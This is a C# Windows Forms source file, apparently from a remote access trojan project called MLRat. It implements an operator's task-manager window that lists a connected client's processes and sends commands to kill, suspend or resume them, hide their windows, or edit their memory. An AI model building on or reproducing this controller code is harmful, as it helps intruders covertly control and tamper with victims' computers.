using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class TaskManagerForm : Form
    {
        public IClient Client { get; set; }
        ImageList images = new ImageList();
        formMemoryEdit memoryEditForm = null;
        public TaskManagerForm(IClient c, IServerUIHandler ui)
        {
            InitializeComponent();
            Client = c;
            Image standardProc = ui.GetImage("service.png");
            Image thisProc = ui.GetImage("bug.png");
            Image appImage = ui.GetImage("application.png");
            

            if(standardProc != null)
            {
                images.Images.Add("background", standardProc);
                if(thisProc != null)
                    images.Images.Add("me", thisProc);
                else
                    images.Images.Add("me", standardProc);

                if(appImage != null)
                    images.Images.Add("app", appImage);
                else
                    images.Images.Add("app", standardProc);

                lvProcessList.SmallImageList = images;
            }
        }

        private void TaskManagerForm_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("Task manager ({0})", Client.GetVariable<string>("Username", ""));
        }

        public void InvalidProcess()
        {
            if(memoryEditForm != null)
            {
                memoryEditForm.Close();
            }
        }

        public void SetMemoryValue(int value)
        {
            if (memoryEditForm != null)
            {
                memoryEditForm.SetMemoryValue(value);
            }
        }

        public void StartUpdate()
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvProcessList.Items.Clear();
            });
        }

        public void ModuleResponce(string[] modules)
        {
            if(memoryEditForm != null)
            {
                memoryEditForm.SetModules(modules);
            }
        }

        public void AddProcess(string name, int id, string window, bool hasWindow, bool thisProc)
        {
            /*
            if (images.Images.ContainsKey(id.ToString()))
                images.Images.RemoveByKey(id.ToString());
            if (icon != null)
            {
                images.Images.Add(id.ToString(), icon);
            }\*/
            Invoke((MethodInvoker)delegate ()
            {
                ListViewItem i = new ListViewItem(window);
                i.SubItems.Add(id.ToString());
                i.SubItems.Add(name);
                i.Tag = id;
                i.Group = lvProcessList.Groups[hasWindow ? "app" : "background"];
                if(thisProc)
                {
                    i.ImageKey = "me";
                }
                else
                {
                    if (hasWindow)
                    {
                        i.ImageKey = "app";
                    }
                    else
                    {
                        i.ImageKey = "background";
                    }
                }
                lvProcessList.Items.Add(i);
            });
        }
        void AddProcToList(ListViewItem i)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvProcessList.Items.Add(i);
            });
        }

        void RemoveProcFromList(ListViewItem i)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvProcessList.Items.Remove(i);
            });
        }

        public void Destroy()
        {
            Invoke((MethodInvoker)delegate ()
            {
                Dispose();
            });
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.GetProcesses);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvProcessList.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvProcessList.SelectedItems[0];
            int id = (int)i.Tag;
            Client.Send((byte)NetworkCommand.KillProcess, id);
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvProcessList.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvProcessList.SelectedItems[0];
            int id = (int)i.Tag;
            Client.Send((byte)NetworkCommand.SuspendProcess, id);
        }

        private void resumeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvProcessList.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvProcessList.SelectedItems[0];
            int id = (int)i.Tag;
            Client.Send((byte)NetworkCommand.ResumeProcess, id);
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvProcessList.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvProcessList.SelectedItems[0];
            int id = (int)i.Tag;
            Client.Send((byte)NetworkCommand.HideWindow, id);
        }

        private void editMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvProcessList.SelectedItems.Count < 1)
                return;
            ListViewItem i = lvProcessList.SelectedItems[0];
            int id = (int)i.Tag;
            using (memoryEditForm = new formMemoryEdit(Client, id))
            {
                memoryEditForm.Text = string.Format("Edit memory ({0} - PID: {1})", i.SubItems[2].Text, id);
                memoryEditForm.ShowDialog();
            }
            memoryEditForm = null;
        }
    }
}
